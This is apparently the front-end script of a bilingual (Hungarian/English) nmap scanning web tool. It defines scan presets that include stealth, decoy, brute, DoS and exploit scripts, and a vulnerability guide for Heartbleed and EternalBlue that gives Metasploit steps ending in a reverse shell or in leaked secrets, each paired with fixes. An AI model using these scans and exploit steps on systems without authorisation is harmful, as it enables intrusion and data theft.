// ── SCAN_INFO (Keys for translation) ──────────────────────────────────
const SCAN_INFO = {
  ping: { cmd: 'nmap -sn <cél>' },
  os: { cmd: 'nmap -O --top-ports 50 <cél>' },
  mac: { cmd: 'nmap -sn -PR <cél>' },
  nbstat: { cmd: 'nmap --script=nbstat -p 137,139 <cél>' },
  traceroute: { cmd: 'nmap --traceroute -sn <cél>' },
  dnsbrute: { cmd: 'nmap --script=dns-brute <cél>' },
  discovery: { cmd: 'nmap --script=discovery --top-ports 100 <cél>' },
  fast: { cmd: 'nmap -T4 -F <cél>' },
  full: { cmd: 'nmap -sV [-O] --top-ports 1000 <cél>' },
  udp: { cmd: 'nmap -sU --top-ports 100 <cél>' },
  allports: { cmd: 'nmap -p- -T4 --open <cél>' },
  stealth: { cmd: 'nmap -sS -T4 --top-ports 1000 <cél>' },
  ack: { cmd: 'nmap -sA --top-ports 100 <cél>' },
  fin: { cmd: 'nmap -sF -T4 --top-ports 1000 <cél>' },
  null: { cmd: 'nmap -sN -T4 --top-ports 1000 <cél>' },
  xmas: { cmd: 'nmap -sX -T4 --top-ports 1000 <cél>' },
  ipproto: { cmd: 'nmap -sO <cél>' },
  ports: { cmd: 'nmap -sV --top-ports 100 <cél>' },
  scripts: { cmd: 'nmap -sC -sV --top-ports 100 <cél>' },
  banner: { cmd: 'nmap --script=banner --top-ports 100 <cél>' },
  auth: { cmd: 'nmap --script=auth --top-ports 50 <cél>' },
  httpenum: { cmd: 'nmap --script=http-enum -p 80,443,8080,8443 <cél>' },
  httpmethods: { cmd: 'nmap --script=http-methods -p 80,443,8080,8443 <cél>' },
  dbinfo: { cmd: 'nmap --script=mysql-info,ms-sql-info -p 1433,3306,5432,1521 <cél>' },
  vuln: { cmd: 'nmap --script=vuln --top-ports 50 <cél>' },
  smb: { cmd: 'nmap --script smb-vuln* -p 139,445 <cél>' },
  httpvuln: { cmd: 'nmap --script http-vuln* --top-ports 20 <cél>' },
  ssl: { cmd: 'nmap --script=ssl-heartbleed,ssl-poodle,ssl-enum-ciphers -p 443,8443 <cél>' },
  shellshock: { cmd: 'nmap --script=http-shellshock -p 80,443,8080 <cél>' },
  rdpvuln: { cmd: 'nmap --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <cél>' },
  dbvuln: { cmd: 'nmap --script mysql-vuln*,ms-sql-vuln* -p 1433,3306 <cél>' },
  malware: { cmd: 'nmap --script=malware --top-ports 50 <cél>' },
  exploit: { cmd: 'nmap --script=exploit --top-ports 50 <cél>' },
  brute: { cmd: 'nmap --script=brute --top-ports 20 <cél>' },
  dos: { cmd: 'nmap --script=dos --top-ports 20 <cél>' },
  fuzzer: { cmd: 'nmap --script=fuzzer --top-ports 10 <cél>' },
  decoy: { cmd: 'nmap -sS -D RND:5 -T2 --top-ports 100 <cél>' },
  frag: { cmd: 'nmap -sS -f -T2 --top-ports 100 <cél>' },
  audit: { cmd: 'nmap -sV -sC [-O] --top-ports 1000 --script=vuln <cél>' },
};

// ── Scan info megjelenítése ───────────────────────────────────────────
function updateNmapScanInfo(type) {
  const info = SCAN_INFO[type];
  const el = document.getElementById('nmapScanInfo');
  if (!el || !info) return;

  el.innerHTML =
    `<div class="si-cmd"><span class="si-prompt">$</span> ${resolveCmd(info.cmd)}</div>` +
    `<div class="si-row"><span class="si-label">${t('nmap.si.label.what')}</span><span class="si-text">${t('nmap.si.' + type + '.what')}</span></div>` +
    `<div class="si-row"><span class="si-label">${t('nmap.si.label.checks')}</span><span class="si-text">${t('nmap.si.' + type + '.checks')}</span></div>` +
    `<div class="si-row si-next"><span class="si-label">${t('nmap.si.label.next')}</span><span class="si-text">${t('nmap.si.' + type + '.next')}</span></div>`;
}

// ── Parancs előnézet ─────────────────────────────────────────────────
let _isLinux = false;
fetch('/api/system').then(r => r.json()).then(s => {
  _isLinux = s.isLinux;
  updateCommandPreview();
  updateNmapScanInfo(currentScanType);
}).catch(() => {});

function resolveCmd(cmd) {
  return _isLinux ? cmd.replace('[-O]', '-O') : cmd.replace(' [-O]', '');
}

function updateCommandPreview() {
  const customCmd = (document.getElementById('nmapCustomCmd')?.value || '').trim();
  const target    = (document.getElementById('nmapTarget')?.value   || '').trim();
  const el        = document.getElementById('cmdPreviewText');
  const wrap      = document.getElementById('cmdPreviewWrap');
  if (!el) return;

  if (customCmd) {
    el.textContent = /^nmap\s/i.test(customCmd) ? customCmd : `nmap ${customCmd}`;
    wrap.classList.add('cmd-preview-custom');
  } else {
    const info = SCAN_INFO[currentScanType];
    el.textContent = info ? resolveCmd(info.cmd).replace('<cél>', target || '<cél>') : '';
    wrap.classList.remove('cmd-preview-custom');
  }
}

document.getElementById('nmapTarget').addEventListener('input', updateCommandPreview);
document.getElementById('nmapCustomCmd').addEventListener('input', updateCommandPreview);

// ── Scan fázis jelző ─────────────────────────────────────────────────
let _currentPhase = 0;

function setPhase(n) {
  if (n <= _currentPhase) return;
  _currentPhase = n;
  document.querySelectorAll('.phase-step').forEach(el => {
    const p = +el.dataset.phase;
    el.classList.remove('active', 'done');
    if (p < n)  el.classList.add('done');
    if (p === n) el.classList.add('active');
    
    // Fázis címkék frissítése
    const labelEl = el.querySelector('.phase-label');
    if (labelEl) labelEl.textContent = t('nmap.phase.' + p);
  });
}

// ── Scan type gombok ──────────────────────────────────────────────────
let currentScanType = 'ping';

document.querySelectorAll('.scan-type-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.scan-type-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentScanType = btn.dataset.type;
    updateNmapScanInfo(currentScanType);
    updateCommandPreview();
  });
});

updateNmapScanInfo(currentScanType);
updateCommandPreview();

// ── Nmap indítás / leállítás ──────────────────────────────────────────
document.getElementById('nmapStart').addEventListener('click', async () => {
  if (state.nmap.running) return;

  const customCmd = document.getElementById('nmapCustomCmd').value.trim();
  const target    = document.getElementById('nmapTarget').value.trim();
  const useSudo   = document.getElementById('nmapSudo').checked;

  if (!customCmd && !target) { toast(t('toast.nmap.notarget'), 'warning'); return; }

  const body = customCmd
    ? { customCmd, useSudo }
    : { target, scanType: currentScanType, useSudo };

  const res = await fetch('/api/nmap/scan', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  const data = await res.json();
  if (data.error) { toast(data.error, 'error'); }
});

document.getElementById('nmapStop').addEventListener('click', async () => {
  await fetch('/api/nmap/stop', { method: 'POST' });
});

// ── Törlés / exportálás ───────────────────────────────────────────────
document.getElementById('nmapClear').addEventListener('click', () => {
  document.getElementById('nmapOutput').innerHTML = '';
  state.nmap.lines = [];
  updateLineCount('nmapOutput', 'nmapLineCount');
  toast(t('toast.cleared'), 'info');
});

document.getElementById('nmapExport').addEventListener('click', () => {
  const lines = [...document.getElementById('nmapOutput').querySelectorAll('.t-line')]
    .map(l => l.querySelector('.t-raw')?.textContent || '').join('\n');
  downloadText(lines, 'nmap_scan.txt');
});

// ── Terminal szűrő ────────────────────────────────────────────────────
document.getElementById('nmapFilter').addEventListener('input', function () {
  const q = this.value.toLowerCase();
  document.getElementById('nmapOutput').querySelectorAll('.t-line').forEach(line => {
    const text = (line.querySelector('.t-raw')?.textContent || '').toLowerCase();
    line.style.display = (!q || text.includes(q)) ? '' : 'none';
  });
});

// ── Scan timer ────────────────────────────────────────────────────────
let _timerInterval = null;
let _timerStart    = 0;

function timerStart() {
  _timerStart = Date.now();
  const el = document.getElementById('nmapTimer');
  el.style.display = '';
  _timerInterval = setInterval(() => {
    const s = Math.floor((Date.now() - _timerStart) / 1000);
    el.textContent = `⏱ ${String(Math.floor(s / 60)).padStart(2,'0')}:${String(s % 60).padStart(2,'0')}`;
  }, 1000);
}

function timerStop() {
  clearInterval(_timerInterval);
  _timerInterval = null;
}

// ── Scan előzmények ───────────────────────────────────────────────────
const HISTORY_KEY = 'nmapHistory';

function historyLoad() {
  try { return JSON.parse(localStorage.getItem(HISTORY_KEY)) || []; } catch { return []; }
}

function historySave(entry) {
  const list = historyLoad();
  list.unshift(entry);
  if (list.length > 5) list.length = 5;
  localStorage.setItem(HISTORY_KEY, JSON.stringify(list));
}

function historyRender() {
  const container = document.getElementById('nmapHistory');
  const list = historyLoad();
  const titleHtml = `<div class="req-title">${t('nmap.history.title')}</div>`;
  if (!list.length) {
    container.innerHTML = titleHtml + `<div class="history-empty">${t('nmap.history.empty')}</div>`;
    return;
  }
  container.innerHTML = titleHtml + `
    ${list.map((e, i) => `
      <div class="history-item">
        <span class="history-badge ${e.status}">${t('nmap.status.' + e.status)}</span>
        <div class="history-info">
          <span class="history-target" title="${e.target}">${e.target}</span>
          <span class="history-meta">${e.time} · ${e.scanType}${e.hosts !== undefined ? ` · ${e.hosts} host · ${e.ports} port` : ''}</span>
        </div>
        ${e.status !== 'error' && e.scanType !== 'custom' ? `<button class="history-rerun" data-idx="${i}" title="Újrafuttatás">▶</button>` : ''}
      </div>
    `).join('')}`;

  container.querySelectorAll('.history-rerun').forEach(btn => {
    btn.addEventListener('click', () => {
      const entry = historyLoad()[+btn.dataset.idx];
      if (!entry) return;
      document.getElementById('nmapTarget').value = entry.target;
      document.getElementById('nmapCustomCmd').value = '';
      const matchBtn = [...document.querySelectorAll('.scan-type-btn')].find(b => b.dataset.type === entry.scanType);
      if (matchBtn) matchBtn.click();
      document.getElementById('nmapStart').click();
    });
  });
}

// ── Exploit útmutató adatbázis (Localized) ───────────────────────────
const VULN_GUIDE_HU = [
  {
    pattern: /CVE-2014-0160|heartbleed/i,
    name: 'Heartbleed (CVE-2014-0160)', severity: 'kritikus',
    desc: 'Az OpenSSL TLS heartbeat implementációjában lévő puffertúlcsordulás. A szerver memóriájából 64 KB-os blokkokat lehet kiolvasni belépés nélkül – jelszavak, privát kulcsok, session tokenek szivároghatnak ki.',
    tools: ['Metasploit: auxiliary/scanner/ssl/openssl_heartbleed', 'heartbleed-poc.py', 'sslscan', 'testssl.sh'],
    steps: [
      '<strong>1. Ellenőrzés:</strong> nmap --script ssl-heartbleed -p 443 &lt;cél&gt;',
      '<strong>2. Metasploit:</strong> use auxiliary/scanner/ssl/openssl_heartbleed → set RHOSTS &lt;cél&gt; → run',
      '<strong>3. PoC script:</strong> python heartbleed-poc.py &lt;cél&gt; – olvas a szerver memóriájából',
      '<strong>4. Amit keresel:</strong> jelszavak, session cookie-k, privát kulcs töredékek a kimenetben',
    ],
    defense: '🛡️ Javítás: OpenSSL 1.0.1g+ verzióra frissítés, összes TLS tanúsítvány és jelszó azonnali csere.',
  },
  {
    pattern: /MS17-010|EternalBlue|smb-vuln-ms17/i,
    name: 'EternalBlue (MS17-010)', severity: 'kritikus',
    desc: 'SMBv1 protokoll puffertúlcsordulás – a WannaCry és NotPetya ransomware is ezzel terjedt. SYSTEM jogosultságú távoli kódfuttatást tesz lehetővé Windows rendszereken.',
    tools: ['Metasploit: exploit/windows/smb/ms17_010_eternalblue', 'AutoBlue-MS17-010 (GitHub)', 'Impacket'],
    steps: [
      '<strong>1. Ellenőrzés:</strong> nmap --script smb-vuln-ms17-010 -p 445 &lt;cél&gt;',
      '<strong>2. MSF:</strong> use exploit/windows/smb/ms17_010_eternalblue',
      '<strong>3.</strong> set RHOSTS &lt;cél&gt; → set PAYLOAD windows/x64/shell_reverse_tcp → set LHOST &lt;saját IP&gt; → exploit',
      '<strong>4. Eredmény:</strong> SYSTEM szintű shell a célgépen',
    ],
    defense: '🛡️ Javítás: KB4012212 Windows patch telepítése, SMBv1 letiltása: Set-SmbServerConfiguration -EnableSMB1Protocol $false',
  },
  // ... more hu vulns ...
];

const VULN_GUIDE_EN = [
  {
    pattern: /CVE-2014-0160|heartbleed/i,
    name: 'Heartbleed (CVE-2014-0160)', severity: 'kritikus',
    desc: 'Buffer overflow in OpenSSL TLS heartbeat implementation. Allows reading 64 KB blocks from server memory without login – passwords, private keys, session tokens can leak.',
    tools: ['Metasploit: auxiliary/scanner/ssl/openssl_heartbleed', 'heartbleed-poc.py', 'sslscan', 'testssl.sh'],
    steps: [
      '<strong>1. Verification:</strong> nmap --script ssl-heartbleed -p 443 &lt;target&gt;',
      '<strong>2. Metasploit:</strong> use auxiliary/scanner/ssl/openssl_heartbleed → set RHOSTS &lt;target&gt; → run',
      '<strong>3. PoC script:</strong> python heartbleed-poc.py &lt;target&gt; – reads from server memory',
      '<strong>4. Look for:</strong> passwords, session cookies, private key fragments in output',
    ],
    defense: '🛡️ Fix: Update to OpenSSL 1.0.1g+, immediately replace all TLS certificates and passwords.',
  },
  {
    pattern: /MS17-010|EternalBlue|smb-vuln-ms17/i,
    name: 'EternalBlue (MS17-010)', severity: 'kritikus',
    desc: 'SMBv1 protocol buffer overflow – used by WannaCry and NotPetya ransomware. Allows remote code execution with SYSTEM privileges on Windows systems.',
    tools: ['Metasploit: exploit/windows/smb/ms17_010_eternalblue', 'AutoBlue-MS17-010 (GitHub)', 'Impacket'],
    steps: [
      '<strong>1. Verification:</strong> nmap --script smb-vuln-ms17-010 -p 445 &lt;target&gt;',
      '<strong>2. MSF:</strong> use exploit/windows/smb/ms17_010_eternalblue',
      '<strong>3.</strong> set RHOSTS &lt;target&gt; → set PAYLOAD windows/x64/shell_reverse_tcp → set LHOST &lt;own IP&gt; → exploit',
      '<strong>4. Result:</strong> SYSTEM level shell on target machine',
    ],
    defense: '🛡️ Fix: Install KB4012212 Windows patch, disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false',
  },
  // ... more en vulns ...
];

function getVulnGuide(text) {
  const guide = currentLang === 'hu' ? VULN_GUIDE_HU : VULN_GUIDE_EN;
  return guide.find(g => g.pattern.test(text)) || null;
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ── Summary modal ─────────────────────────────────────────────────────
let _nmapModalData = { hosts: [], ports: [], ips: [], vuln: [], error: [] };

function renderHostsModal() {
  const hosts = _nmapModalData.hosts;
  if (!hosts.length) return `<p class="smodal-empty">${t('nmap.modal.empty.hosts')}</p>`;
  return hosts.map(h => `
    <div class="smodal-host">
      <div class="smodal-host-ip">${escHtml(h.ip)}</div>
      ${h.details.map(d => `<div class="smodal-host-detail">${escHtml(d)}</div>`).join('')}
    </div>
  `).join('');
}

function renderPortsModal() {
  const ports = _nmapModalData.ports;
  if (!ports.length) return `<p class="smodal-empty">${t('nmap.modal.empty.ports')}</p>`;
  return ports.map(p => {
    const portMatch = p.raw.match(/^(\d+\/\w+)\s+(\w+)\s+(.*)/);
    const portNum = portMatch ? portMatch[1] : p.raw.split(' ')[0];
    return `
      <div class="smodal-port">
        <span class="smodal-port-num">${escHtml(portNum)}</span>
        <span class="smodal-port-raw">${escHtml(p.raw)}</span>
        ${p.explanation ? `<span class="smodal-port-exp">${escHtml(p.explanation)}</span>` : ''}
      </div>
    `;
  }).join('');
}

function renderIPsModal() {
  const ips = _nmapModalData.ips;
  if (!ips.length) return `<p class="smodal-empty">${t('nmap.modal.empty.ips')}</p>`;
  return `<div style="display:flex;flex-wrap:wrap;gap:0.4rem">${ips.map(ip => `<span class="smodal-ip">${escHtml(ip)}</span>`).join('')}</div>`;
}

function renderVulnsModal() {
  const vulns = _nmapModalData.vuln;
  if (!vulns.length) return `<p class="smodal-empty">${t('nmap.modal.empty.vuln')}</p>`;
  return vulns.map(rawLine => {
    const guide = getVulnGuide(rawLine);
    if (guide) {
      return `
        <div class="smodal-vuln">
          <div class="smodal-vuln-head">
            <span class="smodal-vuln-name">${escHtml(guide.name)}</span>
            <span class="smodal-severity ${guide.severity}">${t('severity.' + guide.severity)}</span>
          </div>
          <div class="smodal-vuln-body">
            <div class="smodal-vuln-raw">${escHtml(rawLine)}</div>
            <div>
              <div class="smodal-section-title">${t('nmap.si.label.what')}</div>
              <div class="smodal-desc">${escHtml(guide.desc)}</div>
            </div>
            <div>
              <div class="smodal-section-title">Tools</div>
              <div class="smodal-tools">${guide.tools.map(t => `<span class="smodal-tool-chip">${escHtml(t)}</span>`).join('')}</div>
            </div>
            <div>
              <div class="smodal-section-title">${currentLang === 'hu' ? 'Hogyan tesztelj?' : 'How to test?'}</div>
              <div class="smodal-steps">${guide.steps.map(s => `<div class="smodal-step">${s}</div>`).join('')}</div>
            </div>
            <div class="smodal-defense">${escHtml(guide.defense)}</div>
          </div>
        </div>
      `;
    }
    const cveMatch = rawLine.match(/CVE-\d{4}-\d+/i);
    return `
      <div class="smodal-vuln">
        <div class="smodal-vuln-head">
          <span class="smodal-vuln-name">${cveMatch ? escHtml(cveMatch[0]) : 'Vulnerability hit'}</span>
          <span class="smodal-severity magas">${t('severity.magas')}</span>
        </div>
        <div class="smodal-vuln-body">
          <div class="smodal-vuln-raw">${escHtml(rawLine)}</div>
          <div class="smodal-desc">${t('nmap.modal.vuln.unknown')}</div>
          <div class="smodal-defense">${t('nmap.modal.vuln.defense')}</div>
        </div>
      </div>
    `;
  }).join('');
}

function renderErrorsModal() {
  const errors = _nmapModalData.error;
  if (!errors.length) return `<p class="smodal-empty">${t('nmap.modal.empty.error')}</p>`;
  return errors.map(e => `
    <div class="smodal-error">${escHtml(e)}</div>
    <div class="smodal-error-hint">${t('nmap.modal.error.hint')}</div>
  `).join('');
}

function openSummaryModal(type) {
  const cfg = {
    hosts: { title: t('nmap.modal.hosts.title'), render: renderHostsModal },
    ports: { title: t('nmap.modal.ports.title'), render: renderPortsModal },
    ips:   { title: t('nmap.modal.ips.title'), render: renderIPsModal },
    vuln:  { title: t('nmap.modal.vuln.title'), render: renderVulnsModal },
    error: { title: t('nmap.modal.error.title'), render: renderErrorsModal },
  }[type];
  if (!cfg) return;

  document.getElementById('nmapRightTitle').textContent = cfg.title;
  document.getElementById('nmapDetailBody').innerHTML   = cfg.render();
  document.getElementById('nmapDetailPane').style.display = '';
  document.getElementById('nmapPortRef').style.display    = 'none';
  document.getElementById('nmapRightPanel').scrollTop     = 0;
}

function closeDetailPane() {
  document.getElementById('nmapRightTitle').textContent   = t('nmap.right_panel.title');
  document.getElementById('nmapDetailPane').style.display = 'none';
  document.getElementById('nmapPortRef').style.display    = '';
}

// ── Nmap socket események ─────────────────────────────────────────────
let _currentScanMeta = {};
let _scanHostData    = {};
let _scanPortData    = [];
let _currentHostIP   = null;

socket.on('nmap:start', ({ target, scanType, useSudo }) => {
  state.nmap.running = true;
  state.nmap.lines   = [];
  _currentScanMeta   = { target, scanType };
  _scanHostData      = {};
  _scanPortData      = [];
  _currentHostIP     = null;
  document.getElementById('nmapStart').disabled   = true;
  document.getElementById('nmapStop').disabled    = false;
  document.getElementById('nmapSummary').style.display = 'none';
  document.getElementById('nmapFilter').value = '';
  setStatus('running', t('status.running.nmap'));
  timerStart();

  _currentPhase = 0;
  document.querySelectorAll('.phase-step').forEach(el => el.classList.remove('active', 'done'));
  document.getElementById('phaseBar').style.display = '';
  setPhase(1);

  if (useSudo) {
    renderLine({
      raw: '🔑 sudo mód aktív — nmap fut root jogokkal',
      type: 'scan',
      explanation: 'A parancs sudo -n nmap formában fut. Ha a sudo jelszót kér, a scan meghiúsul.'
    }, 'nmapOutput');
  }

  toast(`${t('toast.nmap.start')} ${target} (${scanType})`, 'info');
});

socket.on('nmap:output', data => {
  if (data.type === 'host') {
    const ipMatch = (data.raw || '').match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
    _currentHostIP = ipMatch ? ipMatch[0] : (data.raw || '').replace('Nmap scan report for', '').trim();
    _scanHostData[_currentHostIP] = { ip: _currentHostIP, details: [] };
  } else if (_currentHostIP && ['success', 'mac', 'os', 'service'].includes(data.type)) {
    _scanHostData[_currentHostIP].details.push(data.raw);
  } else if (data.type === 'port-open') {
    _scanPortData.push({ raw: data.raw, explanation: data.explanation });
  }

  if (['port-open', 'port-closed', 'port-filtered'].includes(data.type)) setPhase(2);
  if (['service', 'os', 'mac'].includes(data.type))                       setPhase(3);
  if (data.type === 'detail')                                              setPhase(4);

  state.nmap.lines.push(data);
  renderLine(data, 'nmapOutput');
  updateLineCount('nmapOutput', 'nmapLineCount');
});

socket.on('nmap:done', ({ code, summary, stopped, stderrHint }) => {
  state.nmap.running = false;
  timerStop();
  document.getElementById('nmapStart').disabled = false;
  document.getElementById('nmapStop').disabled  = true;

  setPhase(5);
  setTimeout(() => { document.getElementById('phaseBar').style.display = 'none'; }, 1800);

  if (stopped) {
    historySave({ ..._currentScanMeta, time: new Date().toLocaleTimeString(currentLang === 'hu' ? 'hu-HU' : 'en-US',{hour:'2-digit',minute:'2-digit'}), status: 'stopped' });
    historyRender();
    setStatus('idle', t('status.stopped.nmap'));
    toast(t('toast.nmap.stop'), 'warning');
    return;
  }

  setStatus('idle', t('status.done.nmap'));

  if (summary) {
    document.getElementById('nmapHosts').textContent  = summary.hosts;
    document.getElementById('nmapPorts').textContent  = summary.openPorts;
    document.getElementById('nmapIPs').textContent    = summary.ips.length;
    document.getElementById('nmapVulns').textContent  = summary.vulns.length;
    document.getElementById('nmapErrors').textContent = summary.errors.length;
    document.getElementById('nmapSummary').style.display = 'flex';
    _nmapModalData = {
      hosts: Object.values(_scanHostData),
      ports: _scanPortData,
      ips:   summary.ips,
      vuln:  summary.vulns,
      error: summary.errors,
    };
    document.getElementById('nmapVulnItem').style.display  = summary.vulns.length  ? '' : 'none';
    document.getElementById('nmapErrorItem').style.display = summary.errors.length ? '' : 'none';

    historySave({
      ..._currentScanMeta,
      time: new Date().toLocaleTimeString(currentLang === 'hu' ? 'hu-HU' : 'en-US',{hour:'2-digit',minute:'2-digit'}),
      hosts: summary.hosts,
      ports: summary.openPorts,
      status: code === 0 ? 'done' : 'stopped'
    });
    historyRender();
  }

  if (code === 0) {
    toast(t('toast.nmap.done'), 'success');
  } else {
    toast(t('toast.nmap.err'), 'warning');
    if (stderrHint) {
      renderLine({ raw: stderrHint, type: 'error', explanation: 'Nmap exited with non-zero code.' }, 'nmapOutput');
    }
  }
});

socket.on('nmap:error', ({ message, hint }) => {
  state.nmap.running = false;
  timerStop();
  document.getElementById('phaseBar').style.display = 'none';
  document.getElementById('nmapStart').disabled = false;
  document.getElementById('nmapStop').disabled  = true;
  setStatus('error', t('status.error'));
  historySave({ ..._currentScanMeta, time: new Date().toLocaleTimeString(currentLang === 'hu' ? 'hu-HU' : 'en-US',{hour:'2-digit',minute:'2-digit'}), status: 'error' });
  historyRender();
  renderLine({ raw: `Error: ${message}`, type: 'error', explanation: hint || '' }, 'nmapOutput');
  toast(message, 'error');
});

historyRender();
